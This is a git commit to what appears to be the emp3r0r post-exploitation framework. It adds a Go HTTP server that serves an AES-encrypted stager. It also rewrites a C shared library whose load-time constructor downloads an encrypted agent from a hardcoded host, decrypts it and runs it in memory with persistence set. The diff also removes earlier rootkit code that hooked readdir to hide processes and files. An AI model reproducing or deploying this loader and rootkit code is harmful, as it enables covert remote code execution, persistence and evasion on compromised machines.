66f4d8cc23a31381d57d93dec11478c7234fc87e
jm33-m0 <jm33@jm33.me>
2024-12-24 20:46:12 +1100

    feat: add http stager (with AES encryption) and independent HTTP listener

---
+++ core/cmd/listener/http_stager.go
@@ -0,0 +1,96 @@
+package main
+
+import (
+	"bytes"
+	"crypto/aes"
+	"crypto/cipher"
+	"crypto/rand"
+	"encoding/binary"
+	"encoding/hex"
+	"flag"
+	"fmt"
+	"log"
+	"net/http"
+	"os"
+)
+
+// encryptData encrypts the given data using the AES-128-CBC algorithm and the provided key.
+// The IV is prepended to the encrypted data.
+func encryptData(data []byte, key []byte) []byte {
+	block, err := aes.NewCipher(key)
+	if err != nil {
+		log.Fatalf("Failed to create AES cipher: %v", err)
+	}
+
+	// Generate a random IV
+	iv := make([]byte, aes.BlockSize)
+	if _, err := rand.Read(iv); err != nil {
+		log.Fatalf("Failed to generate IV: %v", err)
+	}
+	log.Printf("Generated IV: %s", hex.EncodeToString(iv))
+
+	// Use CBC mode for encryption
+	mode := cipher.NewCBCEncrypter(block, iv)
+
+	// Pad data to ensure its length is a multiple of the block size
+	padding := aes.BlockSize - len(data)%aes.BlockSize
+	padtext := bytes.Repeat([]byte{byte(padding)}, padding)
+	data = append(data, padtext...)
+
+	encrypted := make([]byte, len(data))
+	mode.CryptBlocks(encrypted, data)
+
+	// Prepend the IV to the encrypted data
+	return append(iv, encrypted...)
+}
+
+// deriveKeyFromString derives a key from a string.
+// The key is derived by XORing the characters of the string.
+func deriveKeyFromString(str string) []byte {
+	key := make([]uint32, 4)
+	for i := 0; i < 4; i++ {
+		for j := 0; j < len(str)/4; j++ {
+			key[i] ^= uint32(str[i+j*4]) << (j % 4 * 8)
+		}
+	}
+	keyBytes := make([]byte, 16)
+	for i, v := range key {
+		binary.LittleEndian.PutUint32(keyBytes[i*4:], v)
+	}
+	log.Printf("Derived key: %08x %08x %08x %08x\n", key[0], key[1], key[2], key[3])
+	return keyBytes
+}
+
+// ServeHTTPStager serves the encrypted stager file over HTTP.
+func ServeHTTPStager(stager_enc []byte, port string) {
+	http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
+		log.Printf("Received request from %s", r.RemoteAddr)
+		w.Header().Set("Content-Type", "application/octet-stream")
+		w.Write(stager_enc)
+		log.Printf("Served encrypted stager to %s", r.RemoteAddr)
+	})
+	log.Printf("Starting HTTP server on port %s", port)
+	http.ListenAndServe(fmt.Sprintf(":%s", port), nil)
+}
+
+func main() {
+	stagerPath := flag.String("stager", "", "path to the stager file to serve")
+	port := flag.String("port", "8080", "port to serve the stager file on")
+	keyStr := flag.String("key", "my_secret_key", "key to encrypt the stager file")
+	flag.Parse()
+
+	if *stagerPath == "" {
+		log.Fatal("stager file path is required")
+	}
+
+	stager, err := os.ReadFile(*stagerPath)
+	if err != nil {
+		log.Fatalf("Failed to read stager file: %v", err)
+	}
+
+	key := deriveKeyFromString(*keyStr)
+	encryptedStager := encryptData(stager, key)
+
+	log.Printf("Serving encrypted stager file on port %s", *port)
+	ServeHTTPStager(encryptedStager, *port)
+}
--- loader/elf/stager.c
+++ loader/elf/stager.c
@@ -1,8 +1,10 @@
 #define _GNU_SOURCE
+#include "aes.h"
 #include "elf.h"
 #include <dirent.h>
 #include <dlfcn.h>
 #include <fcntl.h>
+#include <netdb.h>
 #include <signal.h>
 #include <stdio.h>
 #include <stdlib.h>
@@ -13,42 +15,213 @@
 #include <sys/wait.h>
 #include <unistd.h>
 
-// customize these
-const char *HIDE_ME = "emp3r0r";
-const char *HIDDEN_PIDS = "/usr/share/at/batch-job.at";
-const char *HIDDEN_FILES = "/usr/share/at/daily-job.at";
+#define BUFFER_SIZE 1024
 
-// trim trailing whitespace from a string
+#ifdef DEBUG
+#define DEBUG_PRINT(fmt, args...) fprintf(stderr, "DEBUG: " fmt, ##args)
+#else
+#define DEBUG_PRINT(fmt, args...) // Do nothing in release builds
+#endif
+
+/**
+ * Decrypts data using the AES-128-CBC algorithm.
+ *
+ * @param data The data to decrypt.
+ * @param data_size The size of the data.
+ * @param key The decryption key.
+ * @param iv The initialization vector.
+ */
+void decrypt_data(char *data, size_t data_size, const uint8_t *key,
+                  const uint8_t *iv) {
+  struct AES_ctx ctx;
+  AES_init_ctx_iv(&ctx, key, iv);
+  AES_CBC_decrypt_buffer(&ctx, (uint8_t *)data, data_size);
+}
+
+/**
+ * Derives a key from a string.
+ *
+ * @param str The input string.
+ * @param key The derived key.
+ */
+void derive_key_from_string(const char *str, uint8_t *key) {
+  uint32_t temp_key[4] = {0};
+  size_t len = strlen(str);
+  for (int i = 0; i < 4; i++) {
+    for (size_t j = 0; j < len / 4; j++) {
+      temp_key[i] ^= ((uint32_t)str[i + j * 4]) << (j % 4 * 8);
+    }
+  }
+  memcpy(key, temp_key, 16);
+  DEBUG_PRINT("Derived key: %08x %08x %08x %08x\n", temp_key[0], temp_key[1],
+              temp_key[2], temp_key[3]);
+}
+
+/**
+ * Downloads a file from a specified host and port, and decrypts it using the
+ * provided key.
+ *
+ * @param host The host to download the file from.
+ * @param port The port to connect to.
+ * @param path The path of the file on the server.
+ * @param key The decryption key.
+ * @return The decrypted data.
+ */
+char *download_file(const char *host, const char *port, const char *path,
+                    const uint8_t *key) {
+  int sockfd;
+  struct addrinfo hints, *res;
+  char request[BUFFER_SIZE];
+  char buffer[BUFFER_SIZE];
+  char *data = NULL;
+  size_t data_size = 0;
+
+  // Prepare the address info
+  memset(&hints, 0, sizeof(hints));
+  hints.ai_family = AF_UNSPEC;
+  hints.ai_socktype = SOCK_STREAM;
+
+  if (getaddrinfo(host, port, &hints, &res) != 0) {
+    perror("getaddrinfo");
+    return NULL;
+  }
+
+  // Create the socket
+  sockfd = socket(res->ai_family, res->ai_socktype, res->ai_protocol);
+  if (sockfd == -1) {
+    perror("socket");
+    freeaddrinfo(res);
+    return NULL;
+  }
+
+  // Connect to the server
+  if (connect(sockfd, res->ai_addr, res->ai_addrlen) == -1) {
+    perror("connect");
+    close(sockfd);
+    freeaddrinfo(res);
+    return NULL;
+  }
+
+  freeaddrinfo(res);
+
+  // Prepare the HTTP GET request
+  snprintf(request, sizeof(request),
+           "GET %s HTTP/1.1\r\nHost: %s\r\nConnection: close\r\n\r\n", path,
+           host);
+
+  // Send the request
+  if (send(sockfd, request, strlen(request), 0) == -1) {
+    perror("send");
+    close(sockfd);
+    return NULL;
+  }
+
+  // Read the response and store in memory
+  int header_end = 0;
+  while (1) {
+    ssize_t bytes_received = recv(sockfd, buffer, sizeof(buffer), 0);
+    if (bytes_received <= 0) {
+      break;
+    }
+
+    // Skip HTTP headers
+    if (!header_end) {
+      char *header_end_ptr = strstr(buffer, "\r\n\r\n");
+      if (header_end_ptr) {
+        header_end = 1;
+        size_t header_length = header_end_ptr - buffer + 4;
+        data = realloc(data, data_size + bytes_received - header_length);
+        memcpy(data + data_size, buffer + header_length,
+               bytes_received - header_length);
+        data_size += bytes_received - header_length;
+      }
+    } else {
+      data = realloc(data, data_size + bytes_received);
+      memcpy(data + data_size, buffer, bytes_received);
+      data_size += bytes_received;
+    }
+  }
+
+  close(sockfd);
+
+  DEBUG_PRINT("Received data of size: %zu\n", data_size);
+
+#ifdef DEBUG
+  // Save the original downloaded data to disk
+  FILE *file = fopen("/tmp/downloaded_data", "wb");
+  if (file) {
+    fwrite(data, 1, data_size, file);
+    fclose(file);
+    DEBUG_PRINT("Downloaded data saved to /tmp/downloaded_data\n");
+  } else {
+    perror("fopen");
+  }
+#endif
+
+  // Strip the first 6 bytes of the downloaded data
+  data += 6;
+  data_size -= 6;
+
+  // Extract the IV from the beginning of the data
+  uint8_t iv[16];
+  memcpy(iv, data, 16);
+#ifdef DEBUG
+  printf("Extracted IV: ");
+  for (int i = 0; i < 16; i++) {
+    printf("%02x", iv[i]);
+  }
+  printf("\n");
+#endif
+
+  // Decrypt the data
+  decrypt_data(data + 16, data_size - 16, key, iv);
+
+  DEBUG_PRINT("Downloaded and decrypted data of size: %zu\n", data_size - 16);
+
+#ifdef DEBUG
+  // Save the decrypted data to disk
+  file = fopen("/tmp/decrypted_data", "wb");
+  if (file) {
+    fwrite(data + 16, 1, data_size - 16, file);
+    fclose(file);
+    DEBUG_PRINT("Decrypted data saved to /tmp/decrypted_data\n");
+  } else {
+    perror("fopen");
+  }
+#endif
+
+  return data + 16;
+}
+
+/**
+ * Trims trailing whitespace from a string.
+ *
+ * @param buffer The string to trim.
+ */
 void trim_str(char *buffer) { buffer[strcspn(buffer, "\r\n")] = 0; }
 
-// declare sigaction function here to override the one in libc
-// this fixes #244
-int sigaction(int signum, const struct sigaction *act,
-              struct sigaction *oldact) {
-  static int (*orig_sigaction)(int signum, const struct sigaction *act,
-                               struct sigaction *oldact) = NULL;
-  if (!orig_sigaction)
-    orig_sigaction = dlsym(RTLD_NEXT, "sigaction");
+/**
+ * Checks if a file exists.
+ *
+ * @param path The path to the file.
+ * @return 1 if the file exists, 0 otherwise.
+ */
+int is_file_exist(const char *path) { return access(path, F_OK) != -1; }
 
-  if (signum == SIGCHLD) {
-    return 0;
-  }
-
-  return orig_sigaction(signum, act, oldact);
-}
-
-int is_file_exist(const char *path) {
-  if (access(path, F_OK) != -1) {
-    return 1;
-  }
-  return 0;
-}
-
+/**
+ * Checks if a string is present in a file.
+ *
+ * @param path The path to the file.
+ * @param str The string to search for.
+ * @return 1 if the string is found, 0 otherwise.
+ */
 int is_str_in_file(const char *path, const char *str) {
   FILE *fd = fopen(path, "r");
-  int bufferLength = 255;
-  char buffer[bufferLength];
-  while (fgets(buffer, bufferLength, fd)) {
+  if (!fd)
+    return 0;
+
+  char buffer[255];
+  while (fgets(buffer, sizeof(buffer), fd)) {
     trim_str(buffer);
     if (strncmp(str, buffer, strlen(str)) == 0) {
       fclose(fd);
@@ -59,128 +232,9 @@ int is_str_in_file(const char *path, const char *str) {
   return 0;
 }
 
-// check if a pid/file should be hidden
-// returns 1 if is PID and hidden
-// returns 2 if is file and hidden
-// returns 0 if not hidden
-int is_hidden(const char *name) {
-  if (is_file_exist(HIDDEN_PIDS)) {
-    if (is_str_in_file(HIDDEN_PIDS, name)) {
-      return 1;
-    }
-  }
-  if (is_file_exist(HIDDEN_FILES)) {
-    if (is_str_in_file(HIDDEN_FILES, name)) {
-      return 2;
-    }
-  }
-  return 0;
-}
-
-// Get a directory name given a DIR* handle
-static int get_dir_name(DIR *dirp, char *dir_name, size_t size) {
-  int fd = dirfd(dirp);
-  if (fd == -1) {
-    return 0;
-  }
-
-  char dir_fd_path[64];
-  snprintf(dir_fd_path, sizeof(dir_fd_path), "/proc/self/fd/%d", fd);
-  ssize_t ret = readlink(dir_fd_path, dir_name, size);
-  if (ret == -1) {
-    return 0;
-  }
-
-  dir_name[ret] = 0;
-  return 1;
-}
-
-DIR *opendir(const char *name) {
-  static DIR *(*orig_opendir)(const char *) = NULL;
-  if (!orig_opendir)
-    orig_opendir = dlsym(RTLD_NEXT, "opendir");
-
-  DIR *result = orig_opendir(name);
-
-  return result;
-}
-
-struct dirent64 *readdir64(DIR *dirp) {
-  static struct dirent64 *(*orig_readdir64)(DIR *dirp) = NULL;
-  if (!orig_readdir64)
-    orig_readdir64 = dlsym(RTLD_NEXT, "readdir64");
-
-  struct dirent64 *result = NULL;
-  DIR *proc_1 = opendir("/proc/1");
-  struct dirent64 *proc1_dir = orig_readdir64(proc_1);
-  closedir(proc_1);
-
-  result = orig_readdir64(dirp);
-  if (!result) {
-    return NULL;
-  }
-
-  char pwd[1024];
-  if (get_dir_name(dirp, pwd, 1024)) {
-    // processes
-    if (strcmp(pwd, "/proc") == 0) {
-      if (is_hidden(result->d_name) == 1) {
-        return proc1_dir;
-      }
-    }
-
-    // files
-    if (is_hidden(result->d_name) == 2) {
-      return proc1_dir;
-    }
-
-    // HIDE_ME pattern in filename
-    if (strstr(result->d_name, HIDE_ME)) {
-      return proc1_dir;
-    }
-  }
-
-  return result;
-}
-
-struct dirent *readdir(DIR *dirp) {
-  static struct dirent *(*orig_readdir)(DIR *dirp) = NULL;
-  if (!orig_readdir)
-    orig_readdir = dlsym(RTLD_NEXT, "readdir");
-
-  struct dirent *result = NULL;
-  DIR *proc_1 = opendir("/proc/1");
-  struct dirent *proc1_dir = orig_readdir(proc_1);
-  closedir(proc_1);
-
-  result = orig_readdir(dirp);
-  if (!result) {
-    return NULL;
-  }
-
-  char pwd[1024];
-  if (get_dir_name(dirp, pwd, 1024)) {
-    // processes
-    if (strcmp(pwd, "/proc") == 0) {
-      if (is_hidden(result->d_name) == 1) {
-        return proc1_dir;
-      }
-    }
-
-    // files
-    if (is_hidden(result->d_name) == 2) {
-      return proc1_dir;
-    }
-
-    // HIDE_ME pattern in filename
-    if (strstr(result->d_name, HIDE_ME)) {
-      return proc1_dir;
-    }
-  }
-
-  return result;
-}
-
+/**
+ * Initializes the library. This function is called when the library is loaded.
+ */
 void __attribute__((constructor)) initLibrary(void) {
   // ignore SIGCHLD
   signal(SIGCHLD, SIG_IGN);
@@ -191,36 +245,19 @@ void __attribute__((constructor)) initLibrary(void) {
   // tell agent not to change argv
   setenv("LD", "true", 1);
 
-  // where to read target ELF file
-  // this should be in sync with emp3r0r inject_loader module
-  char *exe = calloc(1024, sizeof(char));
-  if (readlink("/proc/self/exe", exe, 1024) < 0) {
-    perror("readlink");
-    return;
-  }
-  const char *exe_name = basename(exe);
-  char *elf_path = calloc(1024, sizeof(char)); // path to target ELF file
-  const char *cwd = getcwd(NULL, 0);
-  // decides where to get target ELF binary
-  snprintf(elf_path, 1024, "%s/_%s", cwd, exe_name);
-
-  // check if target ELF file exists, if not, abort
-  if (!is_file_exist(elf_path)) {
+  // update with the correct host, port, path, and key string
+  const char *host = "192.168.122.202";
+  const char *port = "8000";
+  const char *path = "/agent";
+  const char *key_str = "my_secret_key";
+  uint8_t key[16];
+  derive_key_from_string(key_str, key);
+  char *buf = download_file(host, port, path, key);
+  if (!buf) {
     return;
   }
 
-  // read it
-  FILE *f = fopen(elf_path, "rb");
-  if (f == NULL) {
-    return;
-  }
-  fseek(f, 0, SEEK_END);
-  int size = ftell(f);
-  fseek(f, 0L, SEEK_SET);
-  char *buf = malloc(size);
-  fread(buf, size, 1, f);
-  fclose(f);
-  char *argv[] = {elf_path, NULL};
+  char *argv[] = {"", NULL};
   char *envv[] = {"PATH=/bin:/usr/bin:/sbin:/usr/sbin",
                   "HOME=/tmp",
                   "PERSISTENCE=true",
@@ -232,8 +269,14 @@ void __attribute__((constructor)) initLibrary(void) {
   // in child process
   if (child == 0) {
     // Run the ELF
+    DEBUG_PRINT("Running ELF...\n");
     elf_run(buf, argv, envv);
   }
 }
 
-void __attribute__((destructor)) cleanUpLibrary(void) {}
+/**
+ * Cleans up the library. This function is called when the library is unloaded.
+ */
+void __attribute__((destructor)) cleanUpLibrary(void) {
+  DEBUG_PRINT("Cleaning up library...\n");
+}
